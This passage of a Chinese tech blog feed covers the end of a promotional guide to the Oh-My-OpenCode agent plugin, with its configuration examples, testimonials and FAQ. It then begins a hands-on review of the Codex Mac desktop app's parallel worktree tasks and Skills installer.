  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-28">📚 内置技能</h3>
<p>Oh-My-OpenCode 内置实用技能：</p>

















<table><thead><tr><th>技能</th><th>功能</th></tr></thead><tbody><tr><td><code>playwright</code></td><td>浏览器自动化、网页测试</td></tr><tr><td><code>git-master</code></td><td>Git 高级操作（原子提交、历史搜索）</td></tr></tbody></table>
<h4 data-id="heading-29">钩子系统</h4>
<p>25+ 内置钩子，均可通过 <code>disabled_hooks</code> 配置：</p>
<ul>
<li>PreToolUse：工具调用前</li>
<li>PostToolUse：工具调用后</li>
<li>UserPromptSubmit：用户提交提示时</li>
<li>Stop：智能体停止时</li>
</ul>
<hr/>
<h3 data-id="heading-30">🚀 使用技巧与最佳实践</h3>
<h4 data-id="heading-31">1️⃣ 使用 <code>ultrawork</code> 魔法词</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在任何提示中包含 ultrawork 或 ulw</span>
ulw: 重构这个 React 组件，添加 TypeScript 类型

<span class="hljs-comment"># 智能体会自动：</span>
<span class="hljs-comment"># - 启动并行 explore/librarian 代理</span>
<span class="hljs-comment"># - 使用 LSP 进行确定性重构</span>
<span class="hljs-comment"># - 强制完成任务</span>
</code></pre>
<h4 data-id="heading-32">2️⃣ 根据任务类型选择 Agent</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 快速代码库探索 - explore agent</span>
<span class="hljs-comment"># 自动路由到：gemini-3-flash-preview（100万+ tokens）</span>

<span class="hljs-comment"># 复杂架构设计 - oracle agent</span>
<span class="hljs-comment"># 自动路由到：claude-opus-4.5（强推理）</span>

<span class="hljs-comment"># 文档搜索 - librarian agent</span>
<span class="hljs-comment"># 自动路由到：claude-sonnet-4.5（平衡速度和质量）</span>

<span class="hljs-comment"># 多模态分析 - multimodal-looker agent</span>
<span class="hljs-comment"># 自动路由到：claude-opus-4.5（多模态强）</span>
</code></pre>
<h4 data-id="heading-33">3️⃣ 利用并行智能体</h4>
<p>Oh-My-OpenCode 会自动：</p>
<ul>
<li>并行启动多个 explore/librarian 代理</li>
<li>按提供商/模型配置并发限制</li>
<li>像真正的开发团队一样协作</li>
</ul>
<p>你不需要手动管理，系统自动处理。</p>
<h4 data-id="heading-34">4️⃣ 上下文管理已优化</h4>
<ul>
<li>✅ OhMyOpenCode 积极利用多个智能体来减轻上下文负担</li>
<li>✅ 你的智能体现在是开发团队负责人</li>
<li>✅ 你是 AI 经理</li>
</ul>
<p>不再需要担心上下文窗口。</p>
<hr/>
<h3 data-id="heading-35">🔧 高级配置</h3>
<h4 data-id="heading-36">禁用特定功能</h4>
<p>如果不想启用所有功能，可以选择性禁用：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"disabled_hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"preToolUse"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"postToolUse"</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"disabled_features"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"comment_checker"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"todo_enforcer"</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-37">项目级配置</h4>
<p>在项目根目录创建 <code>.opencode/oh-my-opencode.json</code>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"sisyphus"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"project-specific-model"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>项目级配置优先级高于用户级配置。</p>
<h4 data-id="heading-38">环境变量</h4>
<p>支持通过环境变量配置：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> OMO_MAX_CONCURRENT=10
<span class="hljs-built_in">export</span> OMO_DEBUG=<span class="hljs-literal">true</span>
</code></pre>
<hr/>
<h3 data-id="heading-39">📈 真实案例</h3>
<h4 data-id="heading-40">案例 1：清理 8000 个 ESLint 警告</h4>
<blockquote>
<p>"用 Oh My Opencode 仅用一天就清理了 8000 个 eslint 警告" — Jacob Ferrari</p>
</blockquote>
<p><strong>工作原理：</strong></p>
<ol>
<li>Sisyphus 启动并行 explore 代理分析项目结构</li>
<li>利用 AST-Grep 进行语义级别的搜索和替换</li>
<li>LSP 确保重构的确定性</li>
<li>Todo 执行器强制完成所有警告的修复</li>
</ol>
<h4 data-id="heading-41">案例 2：45k 行 Tauri 应用 → SaaS Web 应用</h4>
<blockquote>
<p>"我使用 ohmyopencode 和 ralph loop 在一夜之间将一个 45k 行的 tauri 应用转换成了 SaaS Web 应用。从访谈提示开始，要求它对问题进行评分和建议。看着它工作非常精彩，今早醒来发现网站基本上已经可以运行了！" — James Hargis</p>
</blockquote>
<p><strong>工作原理：</strong></p>
<ol>
<li>Prometheus 制定详细迁移计划</li>
<li>Hephaestus 自主深度工作者端到端完成</li>
<li>多个并行智能体协作</li>
<li>上下文智能管理处理大项目</li>
</ol>
<h4 data-id="heading-42">案例 3：3 个月的工作 → 7 天 → 1 小时</h4>
<blockquote>
<p>"如果 Claude Code 能在 7 天内完成人类 3 个月的工作，那么 Sisyphus 只需 1 小时。它会持续工作直到任务完成。它是一个非常自律的智能体。" — B, 量化研究员</p>
</blockquote>
<p><strong>关键因素：</strong></p>
<ul>
<li>Todo 执行器强制完成</li>
<li>并行智能体加速</li>
<li>LSP/AST 工具提升精度</li>
<li>上下文智能管理</li>
</ul>
<hr/>
<h3 data-id="heading-43">🎯 用户评价</h3>
<blockquote>
<p>"它让我取消了 Cursor 订阅。开源社区正在发生令人难以置信的事情。" — Arthur Guiot</p>
</blockquote>
<blockquote>
<p>"我还没能准确表达出它为什么如此出色，但开发体验已经达到了一个完全不同的维度。" — 苔硯:こけすずり</p>
</blockquote>
<blockquote>
<p>"用了 oh-my-opencode，你再也不会回头了" — d0t3ch</p>
</blockquote>
<blockquote>
<p>"你们应该把这个合并到核心代码并招募他。认真的。这真的非常非常非常好。" — Henning Kilset</p>
</blockquote>
<blockquote>
<p>"如果你能说服他的话就雇用 @yeon_gyu_kim，这个人彻底革新了 opencod" — [截断]</p>
</blockquote>
<hr/>
<h3 data-id="heading-44">⚠️ 常见问题与解决方案</h3>
<h4 data-id="heading-45">Q1: 为什么选择 oh-my-opencode 而不是其他插件？</h4>
<p><strong>A:</strong></p>
<ul>
<li>✅ <strong>完整的智能体团队</strong>，不只是工具集合</li>
<li>✅ <strong>Hephaestus 自主深度工作者</strong>，目标导向执行</li>
<li>✅ <strong>Todo 执行器</strong>，强制完成任务</li>
<li>✅ <strong>LSP/AST 支持</strong>，确定性重构</li>
<li>✅ <strong>开箱即用</strong>，无需复杂配置</li>
<li>✅ <strong>24,000 美元 token 的实战经验</strong>融入</li>
</ul>
<h4 data-id="heading-46">Q2: 如何切换模型？</h4>
<p>在 <code>oh-my-opencode.json</code> 中修改对应 agent 或 category 的 model 字段：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"sisyphus"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your-preferred-model"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-47">Q3: 如何添加新 MCP 插件？</h4>
<p>在 <code>opencode.json</code> 的 <code>mcp</code> 字段中添加：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"your-mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"your-command"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"local"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-48">Q4: 如何调试配置？</h4>
<p>启用调试模式：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"debug"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>或在环境变量中设置：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> OMO_DEBUG=<span class="hljs-literal">true</span>
</code></pre>
<h4 data-id="heading-49">Q5: 如何优化性能？</h4>
<ol>
<li><strong>使用 Gemini 3 Flash 处理大文件</strong>（100万+ tokens）</li>
<li><strong>合理设置并发限制</strong>：<code>max_concurrent</code></li>
<li><strong>利用并行智能体</strong>：系统自动管理</li>
<li><strong>使用 LSP 重构</strong>：比文本替换更精确</li>
</ol>
<hr/>
<h3 data-id="heading-50">📋 总结</h3>
<h4 data-id="heading-51">Oh-My-OpenCode 的核心价值</h4>

















































<table><thead><tr><th>特性</th><th>价值</th></tr></thead><tbody><tr><td><strong>Sisyphus 主智能体</strong></td><td>像你的团队一样编码</td></tr><tr><td><strong>专业智能体团队</strong></td><td>各司其职，协作高效</td></tr><tr><td><strong>Hephaestus 自主工作者</strong></td><td>目标导向，自主决策</td></tr><tr><td><strong>ultrawork 魔法词</strong></td><td>一键启动高级功能</td></tr><tr><td><strong>并行智能体</strong></td><td>像真正的开发团队</td></tr><tr><td><strong>Todo 执行器</strong></td><td>强制完成任务</td></tr><tr><td><strong>LSP/AST 工具</strong></td><td>确定性重构</td></tr><tr><td><strong>上下文智能管理</strong></td><td>多智能体分担负担</td></tr><tr><td><strong>开箱即用</strong></td><td>默认启用所有功能</td></tr><tr><td><strong>精选 MCP</strong></td><td>Exa、Context7、Grep.app</td></tr></tbody></table>
<h4 data-id="heading-52">与其他工具的对比</h4>













































<table><thead><tr><th>特性</th><th>Oh-My-OpenCode</th><th>其他工具</th></tr></thead><tbody><tr><td>智能体团队</td><td>✅ 完整团队</td><td>❌ 单一智能体</td></tr><tr><td>并行执行</td><td>✅ 后台智能体</td><td>❌ 串行执行</td></tr><tr><td>强制完成</td><td>✅ Todo 执行器</td><td>❌ 可能半途而废</td></tr><tr><td>LSP/AST</td><td>✅ 完整支持</td><td>❌ 文本匹配</td></tr><tr><td>上下文管理</td><td>✅ 多智能体分担</td><td>❌ 单智能体负担</td></tr><tr><td>开箱即用</td><td>✅ 默认启用</td><td>❌ 需要复杂配置</td></tr><tr><td>开源</td><td>✅ MIT 许可证</td><td>⚠️ 闭源/部分开源</td></tr></tbody></table>
<h4 data-id="heading-53">下一步建议</h4>
<ol>
<li><strong>直接安装就行</strong>：添加插件到 <code>opencode.json</code></li>
<li><strong>使用 <code>ulw</code> 魔法词</strong>：一键启动高级功能</li>
<li><strong>尝试不同的智能体组合</strong>：根据项目需求调整</li>
<li><strong>探索 MCP 插件</strong>：扩展 AI 能力</li>
<li><strong>加入社区</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.gg%2FPUwSMR9XNk" target="_blank" title="https://discord.gg/PUwSMR9XNk" ref="nofollow noopener noreferrer">Discord</a></li>
</ol>
<h4 data-id="heading-54">资源链接</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcode-yeongyu%2Foh-my-opencode" target="_blank" title="https://github.com/code-yeongyu/oh-my-opencode" ref="nofollow noopener noreferrer">Oh-My-OpenCode GitHub</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai" target="_blank" title="https://opencode.ai" ref="nofollow noopener noreferrer">OpenCode 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io" target="_blank" title="https://modelcontextprotocol.io" ref="nofollow noopener noreferrer">MCP 协议规范</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.gg%2FPUwSMR9XNk" target="_blank" title="https://discord.gg/PUwSMR9XNk" ref="nofollow noopener noreferrer">Discord 社区</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcode-yeongyu%2Foh-my-opencode%2Fblob%2Fdev%2Fdocs%2Fultrawork-manifesto.md" target="_blank" title="https://github.com/code-yeongyu/oh-my-opencode/blob/dev/docs/ultrawork-manifesto.md" ref="nofollow noopener noreferrer">Ultrawork Manifesto</a></li>
</ul>
<hr/>
<h3 data-id="heading-55">🎓 作者札记</h3>
<blockquote>
<p><strong>OpenCode 是 Debian/Arch，Oh-My-OpenCode 就是 Ubuntu。</strong></p>
</blockquote>
<p>我纯粹为个人开发使用了价值 <strong>24,000 美元 token 的 LLM</strong>。
尝试了每一个工具，把它们配置到极致。但始终是 OpenCode 胜出。</p>
<p>我遇到的每个问题的答案都融入了这个插件。直接安装使用。</p>
<p><strong>不要再为智能体工具的选择而烦恼了。</strong>
<strong>我会进行研究，借鉴最好的，然后发布更新。</strong></p>
<hr/>
<p><strong>警告</strong>：生产力可能飙升太快。别让你的同事发现。</p>
<blockquote>
<p>其实，我会传播这个消息。让我们看看谁会赢。</p>
</blockquote>
<hr/>
<p><strong>如果这篇文章对你有帮助，欢迎点赞、收藏、评论！有问题也欢迎在评论区讨论～</strong></p>
<p><strong>别忘了使用 <code>ulw</code> 魔法词，让智能体像真正的开发团队一样工作！</strong></p>
<p>#AI编程 #OpenCode #OhMyOpenCode #Claude #开发工具 #Sisyphus #智能体 #编程助手</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Codex出Mac桌面版了，Skills和自动化任务比想象中好用，我要抛弃Codex CLI了]]></title>    <link>https://juejin.cn/post/7602252722373165107</link>    <guid>https://juejin.cn/post/7602252722373165107</guid>    <pubDate>2026-02-03T04:28:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602252722373165107" data-draft-id="7602154088477114406" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Codex出Mac桌面版了，Skills和自动化任务比想象中好用，我要抛弃Codex CLI了"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-03T04:28:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="子昕AI编程"/> <meta itemprop="url" content="https://juejin.cn/user/3273679891602858"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Codex出Mac桌面版了，Skills和自动化任务比想象中好用，我要抛弃Codex CLI了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3273679891602858/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    子昕AI编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:28:28.000Z" title="Tue Feb 03 2026 04:28:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>大家好，我是子昕，一个干了10年的后端开发，现在在AI编程这条路上边冲边摸索，每天都被新技术追着跑。</p>
</blockquote>
<p>OpenAI发布了Codex桌面应用的Mac版本，奥特曼亲自在社交媒体上宣布。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16378f958a01433d8e95fa35a160530e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=6nV9JUaKmTCYiL7iDCDBLJ7QRGs%3D" alt="图片" loading="lazy"/></p>
<p>说实话，看到这个消息我第一反应是：CLI不是挺好用的吗，干嘛还要出个桌面版？</p>
<p>直到我装上体验了一圈，才发现这个应用解决的问题确实是CLI做不到的——<strong>同时管理多个AI编码任务，而且互不干扰</strong>。</p>
<p>简单说，CLI是你和一个AI助手对话，桌面版是你指挥一个AI团队干活。</p>
<h2 data-id="heading-0">核心要点</h2>
<ul>
<li>现在只有Mac版，Windows版后续推出</li>
<li>支持多任务并行，每个任务用worktree隔离</li>
<li>内置Skills系统，可以安装第三方技能</li>
<li>自动化任务可以定时执行</li>
<li>为庆祝发布，所有付费用户流量限制翻倍两个月</li>
<li>免费用户限时也能用</li>
</ul>
<h2 data-id="heading-1">为啥要出桌面版</h2>
<p>OpenAI的逻辑其实挺清楚：</p>
<p>Codex CLI推出后，大家发现AI已经能处理越来越复杂的任务了。但问题是，当你想同时让AI做几件事的时候，CLI就不够用了——你得开好几个终端窗口，手动管理不同的分支，很容易乱套。</p>
<p>桌面版就是为了解决这个问题。它的定位是<code>AI智能体指挥中心</code>，让你能像项目经理一样，把不同的任务分配给不同的AI，然后统一查看进度和结果。</p>
<h2 data-id="heading-2">实际体验</h2>
<h3 data-id="heading-3">1. 新建会话</h3>
<p>打开应用后，可以同时把你之前的多个项目都添加进来，每个项目之前在Codex CLI或者idea插件上的会话历史，都会自动同步过来。</p>
<p>然后给项目新建一个会话，这个会话可以选择已经添加到应用的项目，也可以添加新的项目。</p>
<p>创建会话这个流程和Codex CLI差不多。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f82f8ed6827f4c7f91f5597a948b3c98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=57OUCj9AnJ9YojKiKjYxOopgi3I%3D" alt="新建会话截图展示" loading="lazy"/></p>
<p>新建会话截图展示</p>
<p>如果你的项目是git仓库，每次Codex改代码，都能看到详细的diff记录。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9761e3c9a4384c078afce9c2d2985c37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=DODYlmuZFiL%2B3z5bJUVXrblMZuE%3D" alt="图片" loading="lazy"/></p>
<p>这个功能很多人应该期待挺久了，终于有了。</p>
<p>更关键的是<strong>worktree支持</strong>。</p>
<p>简单说，就是每个任务都在独立的分支和工作目录里跑，互不影响。你可以同时让一个AI修bug，另一个AI写新功能，第三个AI做性能优化，完全不会冲突。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6bdf78a6b6f4631a33703cdecad1b94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=bQ%2F546B8Tc8seBn%2FJ0MX09XEbtA%3D" alt="使用worktree创建并行任务" loading="lazy"/></p>
<p>使用worktree创建并行任务</p>
<h3 data-id="heading-4">2. Skills系统</h3>
<p>Codex应用内置了一堆Skills，点击加号就能安装。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09339a20d1fb466fb685d930c9ba25e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=E4LvZyI3ur4EB3%2BBWypaLqZi5xw%3D" alt="codex应用内置Skills列表" loading="lazy"/></p>
<p>codex应用内置Skills列表</p>
<p>安装后点编辑图标就能用：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/518e69371097447890c002e54942914c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=wv7f4fXp0LxeikD67m99x4rKnxQ%3D" alt="图片" loading="lazy"/></p>
<p>Codex应用预装了两个skill：<strong>Skill Installer</strong> 和 <strong>Skill Creator</strong>。</p>
<p>Skill Installer是用来装新技能的。有三种装法：</p>
<ul>
<li>直接按名称装官方精选技能：</li>
</ul>

<pre><code class="hljs language-bash" lang="bash"><span class="hljs-variable">$skill</span>-installer gh-address-comments
</code></pre>
<ul>
<li>从实验文件夹装：</li>
</ul>

<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$skill</span>-installer install the create-plan skill <span class="hljs-keyword">from</span> the .experimental folder
</code></pre>
<ul>
<li>用GitHub URL装(这个厉害了，可以装第三方的)：</li>
</ul>

<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-variable">$skill</span>-installer install <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/openai</span><span class="hljs-regexp">/skills/tree</span><span class="hljs-regexp">/main/skills</span><span class="hljs-regexp">/.experimental/create</span>-plan
</code></pre>
<p>我试了下用GitHub URL装一个非官方的Skill：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/913f59058b2f4b7eb59ef6b130e3a8a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=7J9Kr%2FuewQxndT91kV7dPHJU0HU%3D" alt="图片" loading="lazy"/></p>
<p>选择技能后直接粘贴地址：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a0f44de253049e69a9560f0b8b77d13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=flMAQBX02ug8y4EW7AIe9NKbe1Q%3D" alt="图片" loading="lazy"/></p>
<p>装完重启应用就能看到新技能了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/734bede28fff497abe3836d7ce26d0b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=rfQLHASZJY7gnHdiXIpVrtvWY9o%3D" alt="图片" loading="lazy"/></p>
<p>而且这个第三方Skill用起来也没问题：</p>
